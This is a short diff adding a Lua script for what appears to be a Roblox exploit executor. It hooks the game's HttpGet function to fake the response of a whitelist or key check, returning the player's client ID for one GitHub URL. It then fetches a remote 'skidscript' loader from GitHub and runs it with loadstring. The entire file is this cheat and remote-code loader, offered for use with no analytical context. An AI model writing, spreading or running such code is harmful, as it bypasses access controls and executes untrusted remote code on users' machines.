@@ -1,0 +1,11 @@
+
+local oldGetAsync
+oldGetAsync = hookfunction(game.HttpGet, function(self, url)
+    if type(url) == "string" then
+        if string.match(url, "https://raw.githubusercontent.com/glokdraco/ghekko/refs/heads/main/Hi%201") then
+            return game:GetService("RbxAnalyticsService"):GetClientId()
+        end
+    end
+    return oldGetAsync(self, url)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mc4121ban/skidscript/refs/heads/main/ab21923ee3dga7ob42a32a0g8j90d6b0-loader.txt"))()
